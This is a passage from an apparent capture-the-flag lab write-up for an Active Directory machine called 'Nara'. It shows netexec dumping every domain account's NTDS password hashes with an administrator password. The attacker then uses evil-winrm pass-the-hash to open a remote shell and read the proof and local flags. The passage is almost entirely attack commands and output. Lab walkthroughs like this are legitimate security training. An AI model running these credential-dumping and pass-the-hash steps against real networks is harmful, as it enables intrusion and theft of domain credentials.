+SMB         192.168.175.30  445    NARA             nara-security.com\Helen.Robinson:1106:aad3b435b51404eeaad3b435b51404ee:3bef7be42235aeadf25df04f90c6e3d7:::
+SMB         192.168.175.30  445    NARA             nara-security.com\Sara.O&apos;Sullivan:1107:aad3b435b51404eeaad3b435b51404ee:bec726c5bea2f63e4798e0a559c53453:::
+SMB         192.168.175.30  445    NARA             nara-security.com\Jasmine.Roberts:1108:aad3b435b51404eeaad3b435b51404ee:3d24b27a9beba394589bcefa51319e02:::
+SMB         192.168.175.30  445    NARA             nara-security.com\Declan.Reynolds:1109:aad3b435b51404eeaad3b435b51404ee:ee174ee61eadd9b1f3d1f3225037068d:::
+SMB         192.168.175.30  445    NARA             nara-security.com\Jodie.Summers:1110:aad3b435b51404eeaad3b435b51404ee:a241c861f1bfb5e2ae04c9e843304318:::
+SMB         192.168.175.30  445    NARA             nara-security.com\Carolyn.Hill:1111:aad3b435b51404eeaad3b435b51404ee:d65fad2e9d1cf1c44de25751c60e37f6:::
+SMB         192.168.175.30  445    NARA             nara-security.com\Jemma.Humphries:1112:aad3b435b51404eeaad3b435b51404ee:2884cf969a8cd830da7559ee60c9dd3c:::
+SMB         192.168.175.30  445    NARA             nara-security.com\Tracy.White:1113:aad3b435b51404eeaad3b435b51404ee:510037c67d52760ca076ef199fd26c51:::
+SMB         192.168.175.30  445    NARA             NARA$:1000:aad3b435b51404eeaad3b435b51404ee:1ab79aa6a1a76ec59bc9f871e68e816e:::
+SMB         192.168.175.30  445    NARA             [+] Dumped 14 NTDS hashes to /home/kali/.nxc/logs/ntds/NARA_192.168.175.30_2026-03-13_171347.ntds of which 13 were added to the database
+SMB         192.168.175.30  445    NARA             [*] To extract only enabled accounts from the output file, run the following command: 
+SMB         192.168.175.30  445    NARA             [*] grep -iv disabled /home/kali/.nxc/logs/ntds/NARA_192.168.175.30_2026-03-13_171347.ntds | cut -d &apos;:&apos; -f1</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Nara]
+&boxur;&boxh;$ nxc smb 192.168.175.30 -u Administrator -p &apos;Pwned@23&apos;
+SMB         192.168.175.30  445    NARA             [*] Windows Server 2022 Build 20348 x64 (name:NARA) (domain:nara-security.com) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         192.168.175.30  445    NARA             [+] nara-security.com\Administrator:Pwned@23 (Pwn3d!)
+                                                                                                                                                                                                        
+&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Nara]
+&boxur;&boxh;$ nxc smb 192.168.175.30 -u Administrator -p &apos;Pwned@23&apos; --ntds
+SMB         192.168.175.30  445    NARA             [*] Windows Server 2022 Build 20348 x64 (name:NARA) (domain:nara-security.com) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         192.168.175.30  445    NARA             [+] nara-security.com\Administrator:Pwned@23 (Pwn3d!)
+SMB         192.168.175.30  445    NARA             [+] Dumping the NTDS, this could take a while so go grab a redbull...
+SMB         192.168.175.30  445    NARA             Administrator:500:aad3b435b51404eeaad3b435b51404ee:e7ea0f19ad259d5c4e2f000f3edbdd4f:::
+SMB         192.168.175.30  445    NARA             Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         192.168.175.30  445    NARA             krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3f85c2c9778ce40492f6ac891f76b4ca:::
+SMB         192.168.175.30  445    NARA             nara-security.com\Amelia.O&apos;Brien:1104:aad3b435b51404eeaad3b435b51404ee:2a3bc4e4f627ae18128b63ca338249fb:::
+SMB         192.168.175.30  445    NARA             nara-security.com\Damian.Johnson:1105:aad3b435b51404eeaad3b435b51404ee:6037e9a69dfa966cd902e35a5bd17568:::
+SMB         192.168.175.30  445    NARA             nara-security.com\Helen.Robinson:1106:aad3b435b51404eeaad3b435b51404ee:3bef7be42235aeadf25df04f90c6e3d7:::
+SMB         192.168.175.30  445    NARA             nara-security.com\Sara.O&apos;Sullivan:1107:aad3b435b51404eeaad3b435b51404ee:bec726c5bea2f63e4798e0a559c53453:::
+SMB         192.168.175.30  445    NARA             nara-security.com\Jasmine.Roberts:1108:aad3b435b51404eeaad3b435b51404ee:3d24b27a9beba394589bcefa51319e02:::
+SMB         192.168.175.30  445    NARA             nara-security.com\Declan.Reynolds:1109:aad3b435b51404eeaad3b435b51404ee:ee174ee61eadd9b1f3d1f3225037068d:::
+SMB         192.168.175.30  445    NARA             nara-security.com\Jodie.Summers:1110:aad3b435b51404eeaad3b435b51404ee:a241c861f1bfb5e2ae04c9e843304318:::
+SMB         192.168.175.30  445    NARA             nara-security.com\Carolyn.Hill:1111:aad3b435b51404eeaad3b435b51404ee:d65fad2e9d1cf1c44de25751c60e37f6:::
+SMB         192.168.175.30  445    NARA             nara-security.com\Jemma.Humphries:1112:aad3b435b51404eeaad3b435b51404ee:2884cf969a8cd830da7559ee60c9dd3c:::
+SMB         192.168.175.30  445    NARA             nara-security.com\Tracy.White:1113:aad3b435b51404eeaad3b435b51404ee:510037c67d52760ca076ef199fd26c51:::
+SMB         192.168.175.30  445    NARA             NARA$:1000:aad3b435b51404eeaad3b435b51404ee:1ab79aa6a1a76ec59bc9f871e68e816e:::
+SMB         192.168.175.30  445    NARA             [+] Dumped 14 NTDS hashes to /home/kali/.nxc/logs/ntds/NARA_192.168.175.30_2026-03-13_171347.ntds of which 13 were added to the database
+SMB         192.168.175.30  445    NARA             [*] To extract only enabled accounts from the output file, run the following command: 
+SMB         192.168.175.30  445    NARA             [*] grep -iv disabled /home/kali/.nxc/logs/ntds/NARA_192.168.175.30_2026-03-13_171347.ntds | cut -d &apos;:&apos; -f1</code></pre></div>
+<p>The <code class="inline-code">proof.txt</code> flag:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Nara]
+&boxur;&boxh;$ evil-winrm -i 192.168.175.30 -u Administrator -H e7ea0f19ad259d5c4e2f000f3edbdd4f  
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc&apos; for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; cd ..
+*Evil-WinRM* PS C:\Users\Administrator&gt; cd Desktop
+*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; more proof.txt
+77377a660735d0e75a1083c40ae0ca8e
+
+*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt;</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Nara]
+&boxur;&boxh;$ evil-winrm -i <span class="hljs-number">192.168</span>.<span class="hljs-number">175.30</span> -u Administrator -H e7ea0f19ad259d5c4e2f000f3edbdd4f  
+                                        
+Evil-WinRM shell v3.<span class="hljs-number">9</span>
+                                        
+Warning: Remote path completions <span class="hljs-keyword">is</span> disabled due <span class="hljs-keyword">to</span> ruby limitation: undefined <span class="hljs-keyword">method</span> `<span class="hljs-title function_">quoting_detection_proc</span>&apos; <span class="hljs-title function_">for</span> <span class="hljs-title function_">module</span> <span class="hljs-title function_">Reline</span>
+                                        
+<span class="hljs-title function_">Data</span>: <span class="hljs-keyword">For</span> more information, check Evil-WinRM GitHub: https:<span class="hljs-comment">//github.com/Hackplayers/evil-winrm#Remote-path-completion</span>
+                                        
+Info: Establishing connection <span class="hljs-keyword">to</span> remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; cd ..
+*Evil-WinRM* PS C:\Users\Administrator&gt; cd Desktop
+*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; more proof.txt
+<span class="hljs-number">77377</span>a660735d0e75a1083c40ae0ca8e
+
+*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt;</code></pre></div>
+<p>The <code class="inline-code">local.txt</code> flag:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; cd ..
+*Evil-WinRM* PS C:\Users\Administrator&gt; cd ..
+*Evil-WinRM* PS C:\Users&gt; dir
+
+
+    Directory: C:\Users
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----         8/19/2024   8:49 PM                Administrator
+d-r---         7/30/2023  10:24 AM                Public
+d-----         8/19/2024   8:45 PM                tracy.white
+
+
+*Evil-WinRM* PS C:\Users&gt; cd tracy.white/Desktop
+*Evil-WinRM* PS C:\Users\tracy.white\Desktop&gt; more local.txt
+48b47e42942b75b2caccb8b311c87f1f
+
+*Evil-WinRM* PS C:\Users\tracy.white\Desktop&gt;</pre><pre class="hljs"><code>*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; <span class="hljs-keyword">cd</span> <span class="hljs-string">..</span>
+*Evil-WinRM* PS C:\Users\Administrator&gt; <span class="hljs-keyword">cd</span> <span class="hljs-string">..</span>
+*Evil-WinRM* PS C:\Users&gt; dir
+
+
+    Directory: C:\Users
+
+
+Mode                 LastWriteTime         Length Name
+<span class="hljs-params">----</span>                 <span class="hljs-params">-------------</span>         <span class="hljs-params">------</span> <span class="hljs-params">----</span>
+d<span class="hljs-params">-----</span>         8/19/2024   8<span class="hljs-function">:49</span> PM                Administrator
+d-r<span class="hljs-params">---</span>         7/30/2023  10<span class="hljs-function">:24</span> AM                Public
+d<span class="hljs-params">-----</span>         8/19/2024   8<span class="hljs-function">:45</span> PM                tracy.white
+
+
+*Evil-WinRM* PS C:\Users&gt; <span class="hljs-keyword">cd</span> tracy.white/Desktop
+*Evil-WinRM* PS C:\Users\tracy.white\Desktop&gt; more local.txt
+48b47e42942b75b2caccb8b311c87f1f
+
+*Evil-WinRM* PS C:\Users\tracy.white\Desktop&gt;</code></pre></div>
+</div></div>
+					</body>
+				</html>
+			
